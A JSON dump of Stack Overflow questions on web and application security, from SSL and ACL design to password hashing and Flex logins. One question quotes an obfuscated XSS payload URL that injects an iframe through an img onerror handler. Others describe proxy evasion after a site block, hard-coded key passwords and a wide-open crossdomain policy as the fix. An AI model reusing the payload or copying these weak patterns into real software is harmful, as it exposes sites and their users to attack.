etc.</p>\n"},{"tags":["security","http","ssl","dns","openssl"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":319,"score":4,"question_id":8582114,"title":"WWW vs non WWW -- What's the best practice? I need to pick one for my new SSL Certificate","body":"<p>Should my site be a www or non-www address? This is a pretty basic question. I wanted to see what people consider to be the best practice here. The reason I have to pick is I need to buy an SSL certificate for one or the other. Of course I can redirect to the one I pick on the back-end and the technicals are not a problem, but are there any opinions on which to pick and why?</p>\n"},{"tags":["apache","security","http","proxy"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":9058207,"title":"Securing Apache Server at port 8080","body":"<p>I have a linux server configured with a major cloud service provider and I had installed a web app on Tomcat Server and also configured Apache as a proxy at port 8080 for my web site. Just yesterday when i logged into my cloud account, i found that the total bandwidth in and out is about 90GB though i had never used this much GB. When I  inquired with the clould support folks they told me the below</p>\n\n<blockquote>\n  <p>It looks like you have port 8080 open as a http proxy Someone probably found that and has been using that.</p>\n</blockquote>\n\n<p>What does this mean ? How can someone else use my apache server's port 8080 for their purpose ? How can i prevent this ? I have stopped my server at this point to avoid further misuse.</p>\n\n<p>Please suggest.</p>\n\n<p>Thanks,\nDeepna</p>\n"},{"tags":["ruby-on-rails","security","encryption","hash","web-security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12365554,"title":"Is my method of encrypting encryption keys secure?","body":"<p>I'm writing a Rails 3 web app in which anonymous users will be able to enter details about an event and have them encrypted in my database, retrievable only by that user or anyone with the per-event password the user decided on when creating it.</p>\n\n<p>I'm doing this all as an exercise to get my head around programming with encryption and hashing, so it might be a bit overkill, but I'm wanting to have a working model of the 'most-secure' way of doing things, without getting into two-factor auth or a computer not attached to any network hidden in a secret vault 30 km under the earth's crust (of which I already have two).</p>\n\n<p>The current data I'm storing and the encryption of it all is as follows, I'd just like some feedback as to whether I'm using any insecure methods or anything that will weaken my application (and particularly my user's data) to attack.</p>\n\n<p>Every event has the following fields stored in an Oracle database using Transparent Data Encryption:</p>\n\n<ul>\n<li>id</li>\n<li>event_data</li>\n<li>password_hash</li>\n<li>encrypted_iv</li>\n<li>encrypted_key</li>\n<li>admin_retrievable_event_data</li>\n<li>admin_encrypted_iv</li>\n<li>admin_encrypted_key</li>\n</ul>\n\n<p>The webserver is running with restricted system privileges, fully patched, and the webserver processes are unable to browse outside of the site's directory structure.\nThe webserver only runs HTTPS.</p>\n\n<p>When the user creates the event, they supply the clear-text data to go into the event_data field, and a password to secure that data with. To retrieve the data, they only need to enter the id number given to them once they have submitted the form, along with the password they chose. During event creation, the user can also check a box to allow for admin retrievable data to be generated, if they elect to. This option is set to false by default.</p>\n\n<p>This clear-text of the event is still kept in memory for purposes of admin-retrieval, as described later.</p>\n\n<p>The event data is secured using AES256 CBC encryption with a securely generated random IV and key. Both the IV and key are then encrypted using a public key (RSA 2048-bit) stored on the server. Both the IV and key are then XOR'd with the SHA-256 hash of the user-supplied password, and subsequently both stored in the DB.</p>\n\n<p>The user password is then hashed with SHA-256 using a 256-bit securely random generated token as a salt, a string is created with a colon delimiter containing the hash and salt, which is then encrypted with the public key (same one as previous) and stored in the database password_hash field.</p>\n\n<p>The clear-text event data then goes through the same process with a  newly randomly generated key and IV for the admin retrieval and stored, the key and IV then encrypted with a different public key (only used for admin retrieval), and stored in the database without being XOR'd against anything.</p>\n\n<p>To retrieve the data, the user enters their event ID and password. First, the password_hash is unencrypted using the private key (stored on the server in a non-web-accessible directory) (the password for that private key is hard-coded into the app), the user-entered password is then rehashed using the salt from the now unencrypted database entry, and if it matches the hash of the stored salted password, the process continues on (else, returns error of \"Event ID not found or password incorrect\").</p>\n\n<p>The encrypted key and IV are then XOR'ed with a newly generated unsalted hash of the user's password, and decrypted with the same private key/password used for the password hash. These are subsequently used to decrypt the event_data, and return the data to the user.</p>\n\n<p>If the admin wishes to retrieve the data, they must upload the private key and enter the private key's password, at which point the admin IV and key are decrypted, the in-memory private key is destroyed, and the admin retrievable event data is decrypted. </p>\n\n<hr>\n\n<p>So, that is my design for this thing, the only current weaknesses I've identified is storing the private key used for event and user password encryption on the server, and having that private-key password hard coded into the app. I can't see a way around that however without spending a lot of money on a hardware based encryption appliance. If anyone can suggest a better way of architecting this to avoid that problem and not inconvenience end users by generating a separate cert for every event and giving them the private key, subsequently forcing them to re-upload it every time they want to decrypt the event data, I'm more than open to it.</p>\n\n<p>If you see any problems other than those ones, I'm also very curious to hear about it, and would love to be given resources to read or an explanation of what the problem is and what I could do to rectify it.</p>\n\n<p>Please be aware that I do not possess university-level mathematics knowledge and despite rather wanting to understand encryption, I'm far beneath a level where I can do any sort of cryptographic analysis for myself. With this project, I've simply done as much reading on overviews that were of a level I could understand, and tried to apply that knowledge.</p>\n"},{"tags":["android","security","ssl","bouncycastle","keystore"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12382342,"title":"Creating keystore BKS for https android connection","body":"<p>I found <a href=\"http://blog.crazybob.org/2010/02/android-trusting-ssl-certificates.html\" rel=\"nofollow\">tutorial</a> which describes how create and use keystore for https connection. But I have very noob question: where should i put this code to create keystore? at the openssl command promt or in keytool key prompt.</p>\n\n<pre><code>    export CLASSPATH=bcprov-jdk16-145.jar\nCERTSTORE=res/raw/mystore.bks\nif [ -a $CERTSTORE ]; then\n    rm $CERTSTORE || exit 1\nfi\nkeytool \\\n      -import \\\n      -v \\\n      -trustcacerts \\\n      -alias 0 \\\n      -file &lt;(openssl x509 -in mycert.pem) \\\n      -keystore $CERTSTORE \\\n      -storetype BKS \\\n      -provider org.bouncycastle.jce.provider.BouncyCastleProvider \\\n      -providerpath /usr/share/java/bcprov.jar \\\n      -storepass some-password\n</code></pre>\n"},{"tags":["php","security","cookies","yii"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12247162,"title":"Anatomy of a cookie","body":"<p>I am new to cookies . Trying to understand the structure of this cookie my website sets when a user logs in . I am building in PHP using Yii , I have also enabled cookie validation in config . Just want to make sure if it's working properly (with <code>HMAC</code> token being set) and if I am open to any vulnerabilities . </p>\n\n<blockquote>\n  <p>dd3b7ffe10018a899b39986a9d94dfd3b64e7e4as:248:\"05035a5ae619356a622ed6ed805b6695a4fd6c44a:4:{i:0;s:18:\"mjkvj003@gmail.com\";i:1;s:18:\"mjkvj003@gmail.com\";i:2;i:604800;i:3;a:4:{s:6:\"userid\";s:2:\"10\";s:8:\"username\";s:18:\"mjkvj003@gmail.com\";s:4:\"type\";s:10:\"diagnostic\";s:6:\"status\";s:7:\"pending\";}}\";</p>\n</blockquote>\n\n<p>The cookie name in itself is a random 32 character alphanumeric sequence . I also have a phpsession cookie storing session id separately . Here <code>mjkvj003@gmail.com</code> is the username , type and status are application related variables . \nI thought cookies used <code>=</code> for assigning values but here i see <code>:</code> being used . Is this correct ?</p>\n"},{"tags":["ruby-on-rails","ruby","security","json","ruby-on-rails-3"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2428,"score":2,"question_id":5193854,"title":"How to override the 'as_json' or 'to_json' method in order to 'respond_to' without including specified information?","body":"<p>I am using Ruby on Rails 3 and I would like to override (possibly in the model file) the <code>as_json</code> or <code>to_json</code> method in order to <code>respond_to</code> an HTTP request without including some information.</p>\n\n<p>In my Account <em>model</em> I have</p>\n\n<pre><code>def as_json(options = {})\n  super(\n    :except =&gt; [\n      :password\n    ]\n  )\nend\n</code></pre>\n\n<p>In my controller I have</p>\n\n<pre><code>format.json {\n  render :json =&gt; @account, :status =&gt; 200\n}\n</code></pre>\n\n<p>When I make a request, for example, to <code>/account/1.json</code> I have back also the password attributes that, for security reasons, I don't want. </p>\n\n<p>So, <strong>how can I prevent to include specified information?</strong></p>\n\n<hr>\n\n<p>I can do this and it works</p>\n\n<pre><code>format.json {\n  render :json =&gt; @account.to_json(:except =&gt; [:password]), :status =&gt; 200\n}\n</code></pre>\n\n<p>but it I need to <em>refactor</em>.</p>\n"},{"tags":[".net","wpf","wcf","security","active-directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12343090,"title":"Handling Security in a multi tier Windows application","body":"<p>I have an client server solution. The client is wpf and the server is windows service(.net, connected trough wcf).</p>\n\n<p>I Would like my users to have two ways of signing in. One is username and password. Other in to use Windows Security. </p>\n\n<p>The security content should be sent from client to server and the server should validate the user and the role against the active directory. In the username, password scenario, it Would validate using the database.</p>\n\n<p>But what d i send from client to server? An implementation of IPrincipal? Or just the username, and then the server looks it up? And how do i configure the users on the server with the roles in my applikation? Can i display the active directory dialog and browse users and groups and Then match Them with my own roles?</p>\n\n<p><strong>Here is what im thinking about doing - update</strong>\nSend username/password to server on a wcf line with transport security. Then have the server validate if the supplied username/password is valid AND have access to use the application. Please note that there is both authentication and authorization in this. Not all users (even though they are valid Windows Users) may have access to the application. </p>\n\n<p>e.g. They are 100 employees and bought only 10 licenses.</p>\n"},{"tags":["php","security","url","iframe","injection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12391785,"title":"Preventing iframe injection via url?","body":"<p>I'm trying to prevent attacks where a url can be distributed that inserts an iframe (containing a fake login screen) into a PHP site using javascript in the url. Is there some way with PHP to clean out URLs of a page before it is loaded?</p>\n\n<p>The url looks like something like: <code>login.php?login_nav_map=%2Fv3%2Farchives%2Findex.php%22/%3E%3Cimg%20src=%22no.jpg%22%20onerror=%22document.write%28String.fromCharCode%2860,99,101,110,116,101,114,62,10,60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,119,111,114,108,100,116,118,112,99,46,99,111,109,47,98,108,111,45,99,111,110,116,101,110,116,47,117,112,108,111,97,100,115,47,50,48,49,49,47,48,56,47,97,98,99,45,111,110,108,105,110,101,45,116,118,46,106,112,103,34,47,62,60,98,114,47,62,10,60,104,49,62,65,100,</code></p>\n\n<p>and the char codes insert an iframe into my page which I do not want there.</p>\n"},{"tags":["python","security","http","networking","proxy"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":116,"score":1,"question_id":12391013,"title":"how to use proxies without the remote site being able to detect the host/host IP?","body":"<p>I'm attempting to use a proxy, via python, in order to log into a site from a different, specific IP address. It seems that certain websites, however, can detect the original (host) IP address. I've investigated the issue a bit and here's what I found.</p>\n\n<p>There are four proxy methods I've tried:</p>\n\n<ul>\n<li>Firefox with a proxy setting.</li>\n<li>Python with <code>mechanize.set_proxies</code>.</li>\n<li>Firefox in a virtual machine using an internal network, along with another virtual machine acting as a router (having two adapters: a NAT, and that internal network), set up such that the internal network traffic is routed through a proxy.</li>\n<li><a href=\"https://www.torproject.org/download/download-easy.html.en\" rel=\"nofollow\">TorBrowser</a> (which uses Firefox as the actual browser).</li>\n</ul>\n\n<p>For the first three I used the same proxy. The Tor option was just for additional testing, not via my own proxy. The following things are behaviors I've noticed that are expected:</p>\n\n<ul>\n<li>With all of these, if I go to <code>http://www.whatismyip.com/</code>, it gives the correct IP address (the IP address of the proxy, not the host computer).</li>\n<li><code>whatismyip.com</code> says \"No Proxy Detected\" for all of these.</li>\n</ul>\n\n<p>Indeed, it seems like the websites I visit do think my IP is that of the proxy. However, there have been a few weird cases which makes me think that some sites can somehow detect my original IP address.</p>\n\n<ul>\n<li>In one situation, visiting a non-US site via Firefox with a non-US proxy, the site literally was able to print my originating IP address (from the US) and deny me access. Shouldn't this be impossible? Visiting the site via the virtual machine with that same non-US proxy, or the TorBrowser with a non-US exit node, though, the site was unable to do so.</li>\n<li>In a similar situation, I was visiting another non-US site from a non-US proxy. If I logged into the site from Firefox within the virtual machine, or from the TorBrowser with a non-US exit node, the site would work properly. However, if I attempted to log in via Firefox with a proxy (the same proxy the virtual machine uses), or with <code>mechanize</code>, it would fail to log in with an unrelated error message.</li>\n<li>In a third situation, using the <code>mechanize.set_proxies</code> option, I overloaded a site with too many requests so it decided to block access (it would purposefully time out whenever I logged in). I thought it might have blocked the proxy's IP address. However, when I ran the code from a different host machine, but with the same proxy, it worked again, for a short while, until they blocked it again. (No worries, I won't be harassing the site any further - I re-ran the program as I thought it might have been a glitch on my end, not a block from their end.) Visiting that site with the Firefox+proxy solution from one of the blocked hosts also resulted in the purposeful timeout.</li>\n</ul>\n\n<p>It seems to me that all of these sites, in the Firefox + proxy and <code>mechanize</code> cases, were able to find out something about the host machine's IP address, whereas in the TorBrowser and virtual machine cases, they weren't. </p>\n\n<p>How are the sites able to gather this information? What is different about the TorBrowser and virtual machine cases that prevents the sites from gathering this information? And, how would I implement my python script so that the sites I'm visiting via the proxy can't detect the host/host's IP address?</p>\n"},{"tags":["php","security","acl","role-base-authorization"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":176,"score":3,"question_id":12370162,"title":"PHP complex role-based access control lists","body":"<p>I have already made the database and the php code needed to implement this customized ACL system. Now I have to 'Authorize' the current user, and that's where I need your advices.</p>\n\n<p>The system is based on a flexible permission assignment both to the system users and system modules. It has also some predefined, let say user-groups, with the ability to make entirely customized groups also. A global rule could also apply on top of the ACL, but it has the lowest priority over groups or users assigned permissions.</p>\n\n<p>To picture it better:</p>\n\n<p>Predefined Groups:</p>\n\n<ol>\n<li>Limited (No Access)</li>\n<li>Basic User</li>\n<li>Power User</li>\n<li>Administrator</li>\n<li>Visitors (Sample of a customized group)</li>\n</ol>\n\n<p>Here are the access levels (name / value pairs):</p>\n\n<ul>\n<li>disallow / 0</li>\n<li>allow / 1</li>\n<li>deny / 2</li>\n<li>allow if owner / 3</li>\n</ul>\n\n<p>Note: 'Allow' has the higher priority on 'Disallow', so if you have user X 'Disallowed' on Group A, but 'Allowed' on Group B on a certain access, so he would 'Allowed' finally. On the other hand, if user X has the 'Full Access' by being a member of 'Administrator' Group, but if he just 'Denied' on a certain access, he has not the access at the end, that means 'Deny' has higher priority on 'Allow'.</p>\n\n<p>At the top-level you may have something like these:</p>\n\n<ul>\n<li>\"Administrator\" * \"1\", which means Administrators have full access on the system</li>\n<li>\"Visitors\" * \"0\", which means Visitors are not allowed on anything</li>\n</ul>\n\n<p>My question is how to process these kind of checks? Imagine we have a simple authorization mechanism. We would have some indexes in our <code>$_SESSION['user']</code> like <code>$_SESSION['user']['login'] = true;</code> and <code>$_SESSION['user']['id'] = $row['user_id']</code>, right?</p>\n\n<p>Now, if you wanted to implement this mechanism on your script, how you're gonna do it?</p>\n\n<p>I might check for the global access rules at first. Then I would look if the user has already logged-in or not. If yes, just getting all of his groups, and then looking on the permissions' table to see which permissions are assigned to his groups and his user id, and then storing them on the user session. Then when the module says this is my needed permissions to run, I would look then to see if the user has sufficient access to the requested module or not.</p>\n\n<p>Looks pretty complex! Any helps or advice are highly appreciated! :)</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>I'm not using any frameworks. Actually I use, but it's my own. So, there is no pre-made ACL here!</p>\n\n<p><strong>Update:</strong></p>\n\n<p>Do you have any idea about an efficient way to prioritize (overwrite/replace?) ACLs? </p>\n\n<p><code>Deny</code> is highest, then <code>Allow</code> and then <code>Disallow</code>. Also <code>User</code> assigned ACLs are highest, then <code>Group</code> ACLs and finally <code>Global</code> ACLs.</p>\n\n<p>Here is what I came up with that finally:</p>\n\n<p>There is an <code>Array</code>, like this: </p>\n\n<pre><code>$_SESSION['ACL'][$module][$action] = $access_level; // 0, 1, 2, 3\n</code></pre>\n\n<p>First, I would looking for all the Global Rules <code>*</code>, and will put them on the array:</p>\n\n<pre><code>// The current user can see the map, applied by a global rule\n$_SESSION['ACL']['map']['render'] = 1;\n\n// All the other permissions are disallowed by default\n$_SESSION['ACL']['*']['*'] = 0;\n\n// He can edit his preferences, (Owner)\n$_SESSION['ACL']['user']['*'] = 3;  \n</code></pre>\n\n<p>Then, I will look for Group based ACLs:</p>\n\n<pre><code>// User could access the Analyze module, all the methods \n// with Permission Name \"report\". Applied by being a member \n// of \"Moderator\" Group\n$_SESSION['ACL']['analyze']['report'] = 1;\n\n// User NOT allowed to access \"groups\" module, let say\n// it reserved for \"admin\" group! - To see the ACLs' Overwriting!\n$_SESSION['ACL']['groups']['*'] = 0;\n</code></pre>\n\n<p>After all, I would looking for User assigned ACLs:</p>\n\n<pre><code>// User have Full Access to the \"groups\" module.\n// It's gonna replace the last ACL, applied by \"Moderator\" group\n// Note that the order of processing ACLs is IMPORTANT!\n$_SESSION['ACL']['groups']['*'] = 1;\n</code></pre>\n\n<p>I guess it would works perfectly, any ideas? </p>\n\n<p><strong>It Works Pretty Well Now :)</strong></p>\n"},{"tags":["php","security","hash","sha256"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12380825,"title":"PHP Bug in Hashing Function","body":"<p>So I read a quick PHP login system securing <a href=\"http://tinsology.net/2009/06/creating-a-secure-login-system-the-right-way/\" rel=\"nofollow\">article</a>, and was trying to sort of duplicate their hashing method, and during testing, am not getting the proper output.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>function decryptPassword($pw, $salt){\n    $hash = hash('sha256', $salt . hash('sha256', $pw));\n    return $hash;\n}\n\nfunction encryptPassword($pw){\n    $hash = hash('sha256', $pw);\n    $salt = substr(md5(uniqid(rand(), true)), 0, 3);\n    $hash = hash('sha265', $salt . $hash);\n    return array(\n        'salt' =&gt; $salt,\n        'hash' =&gt; $hash\n    );\n}\n</code></pre>\n\n<p>And here is my testing code:</p>\n\n<pre><code>$pw = $_GET['pw'];\n\n$enc = encryptPassword($pw);\n$hash = $enc['hash'];\n$salt = $enc['salt'];\n\necho 'Pass: ' . $pw . '&lt;br /&gt;';\necho 'Hash: ' . $hash . '&lt;br /&gt;';\necho 'Salt: ' . $salt . '&lt;br /&gt;';\necho 'Decrypt: ' . decryptPassword($hash, $salt);\n</code></pre>\n\n<p>Now, the output of this should be pretty obvious, but unfortunately, the <code>$hash</code> variable always comes out empty! I'm trying to figure out what the problem could be, and my only guess would be the second <code>$hash</code> assignment line in the <code>encryptPassword(..)</code> function. After a little testing, I've determined that the first assignment works smoothly, but the second does not.</p>\n\n<p>Any suggestions? Thanks SO!</p>\n"},{"tags":["java","security","websphere","web.xml"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12388293,"title":"IBM WAS ignoring security in web.xml","body":"<p>i have working web application for tomcat web server. I want to migrate it to IBM websphere AS but im stuck at security problem.\nWhole app security is defined in web.xml file like this:</p>\n\n<pre><code>&lt;welcome-file-list&gt;\n    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;\n&lt;/welcome-file-list&gt; \n\n&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Dynamic pages&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;auth-constraint&gt;\n        &lt;description&gt;access.&lt;/description&gt;\n        &lt;role-name&gt;user&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n&lt;/security-constraint&gt;\n\n&lt;login-config id=\"LoginConfig_1\"&gt;\n    &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n    &lt;realm-name&gt;SecureRealm&lt;/realm-name&gt;\n    &lt;form-login-config id=\"FormLoginConfig_1\"&gt;\n        &lt;form-login-page&gt;/login.jsp&lt;/form-login-page&gt;\n        &lt;form-error-page&gt;/loginFail.jsp&lt;/form-error-page&gt;\n    &lt;/form-login-config&gt;\n&lt;/login-config&gt;\n\n&lt;security-role&gt;\n    &lt;description&gt;User of the application.&lt;/description&gt;\n    &lt;role-name&gt;user&lt;/role-name&gt;\n&lt;/security-role&gt; \n</code></pre>\n\n<p>Websphere ignore all this security and allow me to access any page from web app without showing login page. If i go manually to login.jsp and put correct password im forwarded into app but then it fail on <code>getUserPrincipal()</code> because it return null (no login). Also same if i put wrong password im forwarded to loginFail.jsp. <br>\nAlso no error in server logs. <br>What am i doing wrong or is different from tomcat?<br>\nThanks for help.</p>\n"},{"tags":["database","security","encryption","public-key-encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":12378876,"title":"Private/Public key variant for encrypting data online and decrypting with multiple different keys","body":"<p>Assume the following example:</p>\n\n<p>I have an online service where user can register and enter personal data. Now I want to encrypt these data. I have a private key Pr1 and public key Pu1.</p>\n\n<ol>\n<li>User logs in with password at my online service\n<ul>\n<li>Convert login password to fit a private key format = Pr2</li>\n<li>Get public key Pu2 from Pr2</li>\n</ul></li>\n<li>User enters data to store them online in the database</li>\n<li>Encrypt user entered data with Pu1 and <strong>add --recipient Pu2</strong> like <a href=\"http://stackoverflow.com/questions/597188/encryption-with-multiple-different-keys\">Encryption with multiple different keys?</a></li>\n<li>Now I can copy the encrypted data from the online database to my local machine and decrypt the data with my local Pr1</li>\n<li>Users can decrypt their already entered data online using their normal password which is converted to their Pr2 <strong>every time</strong> when they log in (step 2a) but is valid the <strong>entire session</strong></li>\n</ol>\n\n<p>With that approach no data can be decrypted even if an attacker has access to my server <strong>with all files and the database</strong>, right? Sure, a brute force attack is possible but it should take some time as for every try a private key needs to be computed.\nBut no private key is stored online or needs to be exchanged. So this should be pretty save.</p>\n\n<p><strong>Here the question:</strong> If this approach is secure and practicable, then there must be already something similar or better out there which has these functionalities and uses some nice security standards. What is it?</p>\n"},{"tags":["java","flex","security","https","blazeds"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12285948,"title":"Flex secure logon fails when running deployed application","body":"<p>I have a Flex application and am having issues with secure logon / logoff to my Java server application. It works fine in the development environment (FlashBuilder running the Flex and communicating with Apache Tomcat) but fails when we try to use the exported flex application when deployed on the same Tomcat.</p>\n\n<p>We have a large, complex application with a Flex front-end and a Java back-end which runs as a Web Application on Tomcat.\nWe want the login / logout process to use HTTPS so that the username and password are encrypted and aren't subject to certain security issues.</p>\n\n<p>The way that unsecured login works is via a BlazeDS RPC call to a method called login. The user's credentials as parameters to the method.\n<em>(Quick aside: is this the recommended way of performing a login?)</em></p>\n\n<p>Secure login works differently. A token is created from a channelSet which is supplied with the userid and password and an AsyncResponder calls the success or failure function. The login code is shown in update #2 below.</p>\n\n<p>When I run my application in Flash Builder against an Apache Tomcat (ver 7.0.29) secure login and logout succeed. This works regardless of if I am in standard run or debug mode.</p>\n\n<p>However once I create my application and deploy it to my server then it fails with a very generic error.</p>\n\n<p>I am convinced I have setup the HTTPS side of Tomcat correctly (since the application works in the development environment). I believe that the issue lies in when the Flex application is running from <code>file:///...index.html</code> it works but as soon as I try to run it from <code>http://localhost:8080/MyApp/</code> it fails.</p>\n\n<p>I have been pulling my hair out over this for days. Any pointers, documentation, etc. that anyone can give will be gratefully appreciated.</p>\n\n<p>I decided not to include services-config.xml, remoting-config.xml, etc. files in this question since they are large and contain more than is relevant here, but I can supply them on request.</p>\n\n<p><strong>Update: 1</strong></p>\n\n<p>After reviewing the code I released I'd made an error in this question. The login RPC method is used for unsecure login attempts, whilst logging in via a mx.messaging.ChannelSet is used for secure login. I've updated the question to reflect this.</p>\n\n<p><strong>Update: 2</strong></p>\n\n<p>The error returned is an <code>mx.rpc.events.FaultEvent</code> which has the fields:</p>\n\n<pre><code>Fault String: Send failed\nFault Code: Client.Error.MessageSend\n</code></pre>\n\n<p>The logon function (Flex side) is: </p>\n\n<pre><code>public function login(username:String, password:String, loginFunction:Function = null, failureFunction:Function = null):void {\n    if (_usingSecuredConnection) {\n        this.loginSuccessFunction = loginFunction;\n        this.loginFailureFunction = failureFunction;\n\n        // Make sure that the user is not already logged in.\n        if (_channelSet.authenticated == true) {\n            AlertUtil.alertError(\"You are already logged in!\");\n            return;\n        }\n\n        token = _channelSet.login(username, password);\n        token.addResponder(new AsyncResponder(loginResultEvent, loginFaultEvent));\n    } else {\n        // Defer to API\n    SecurityAPI.login(username, password, [onLoginResultNonSecured, loginFunction], [onLoginFailure, failureFunction]);\n    }\n}\n</code></pre>\n\n<p>On an attempt to login securely, it always results in the function loginFaultEvent being invoked invoked with the FaultEvent as stated above.</p>\n\n<p><strong>Update 3</strong></p>\n\n<p>I am convinced that this is now a crossdomain issue. Trying to access https from http is the problem. However I have put what I think is a VERY permissive crossdomain file in the ROOT webapp of my Tomcat server and it has not helped. Anyone know what I am doing wrong? Is it the wrong location for Tomcat7 or have I got a mistake in my crossdomain file? (note: 8443 is my secure port)</p>\n\n<p><strong>crossdomain.xml :</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE cross-domain-policy SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\"&gt;\n&lt;cross-domain-policy&gt;\n    &lt;site-control permitted-cross-domain-policies=\"all\" /&gt;\n    &lt;allow-access-from domain=\"*\" secure=\"false\" to-ports=\"8443\"/&gt;\n    &lt;allow-http-request-headers-from domain=\"localhost\" headers=\"*\" secure=\"false\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p><strong>Update 4</strong></p>\n\n<p>I have now overcome this issue: It was a crossdomain problem and was fixed by placing a cross-domain file in the ROOT webapp directory of my tomcat server. The content of that cross-domain file is:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE cross-domain-policy SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\"&gt;\n&lt;cross-domain-policy&gt;\n  &lt;allow-access-from domain=\"*\" secure=\"false\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>My flex application now communicates HTTP and HTTPS fine using IE9 and Chrome.</p>\n\n<p>However it still doesn't work on Firefox.</p>\n\n<p>Thanks,</p>\n\n<p>Phil</p>\n"},{"tags":["php","security","github"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":73,"score":0,"question_id":12372856,"title":"php read myql password from seperate file","body":"<p>I am trying to obfuscate a MySQL password within my PHP source code, because it is displayed publicly on Github. Here is what I did:</p>\n\n<pre><code>    $pword = file_get_contents('../.brown_bag');\n    $obj-&gt;password = $pword;\n</code></pre>\n\n<p>This doesn't work, I get an access denied error. The file, .brown_bag, contains only one line with a string of only letters. I'm pretty sure file_get_contents() is not returning the data that I expected. I was trying to write concise, simple code and so have avoided the whole fopen rigmarole.  Why doesn't this work, and is there a better way? </p>\n"},{"tags":["database","spring","security","ldap","authorization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12304881,"title":"How to do LDAP auhtentication and DataBase authorization in Spring Security","body":"<p>Can I have a Spring Security project where I authenticate against LDAP and set authorities to the authenticated user against a Data Base?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","rss","amazon-s3","itunes","podcast"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12314455,"title":"What's a good approach to securing MP3 files for a private podcast with Amazon S3?","body":"<p>I'm trying to create a private podcast feeds. Each user of my service gets an account and depending on what they pay, they will receive different content. Some content is sensitive so security is reasonably important; if any of the enclosed audio files made the rounds around the internet, it could be catastrophic for our business.</p>\n\n<p>I am currently prototyping the service and MP3s are stored on S3 and they are not secured. It's time to secure them. From my research, I understand that I can, in fact, secure files on S3 with an access expiry period. But, because I have many users, signing the request with my \"global\" key and have an expiry probably isn't a good idea because </p>\n\n<ol>\n<li>If I need to revoke access, I'll need to do it for everyone</li>\n<li>Since I don't know when, exactly, their podcatcher will request the file, I don't know when to set the expiry.  Sometimes, the podcatcher downloads the feed XML, but only later fetches the MP3 file so the URLs could expire before the client has a chance to fetch them (I'm thinking about iTunes, but there could be others).</li>\n</ol>\n\n<p>The way I see it, I have two options and I'm not sure if either are workable:</p>\n\n<p><strong>Edit</strong> Another potential way, I suppose, would be to <a href=\"http://stackoverflow.com/questions/2636783/django-as-s3-proxy\">role my own security, and simply redirect</a> to an MP3 on S3 with a short expiry if the user is good to go. This seems most sensible.</p>\n\n<ol>\n<li>I can create user accounts on Amazon for ALL of my users and link them to an Amazon token in my database. Everyone's MP3 urls are signed with their secret token and expiry a long time from now. I don't like the idea of storing their tokens on my database, and I'm not sure if the Amazon ACL was designed for this scenario. It also means the files can still be shared if you know the URL.</li>\n<li>I can proxy every request through my server. This means I only have one Amazon account, and I can role my own security system. But proxying every MP3 download through my server sounds slow, wasteful and expensive.</li>\n</ol>\n\n<p>Any ideas on the best way to do this. </p>\n\n<p>P.S. I'm not married to S3. Other solutions could be considered. And I'm on Heroku using Ruby, in case you care. </p>\n"},{"tags":["php","apache","security","zend-framework"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":208,"score":0,"question_id":8264164,"title":"restricting file download in PHP","body":"<p>so suppose my server is located in <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a></p>\n\n<p>I then put a file file.exe in the files directory in the root server hence normally you can download that file by typing this into the browser</p>\n\n<p><a href=\"http://www.example.com/files/file.exe\" rel=\"nofollow\">http://www.example.com/files/file.exe</a></p>\n\n<p>And suppose that I have a php script that first authenticates the user and then redirect them to that file.exe download page </p>\n\n<p>eg. using this method:</p>\n\n<pre><code>   header('Location: http://www.example.com/files/file.exe');\n   exit(0);\n</code></pre>\n\n<p>what is the best way to</p>\n\n<p>1.) prevent unauthenticated users from being able to access that file by typing in that URL above And</p>\n\n<p>2.) have the php script still able to serve that file despite 1.) hence authenticated users should be able to download that file on that 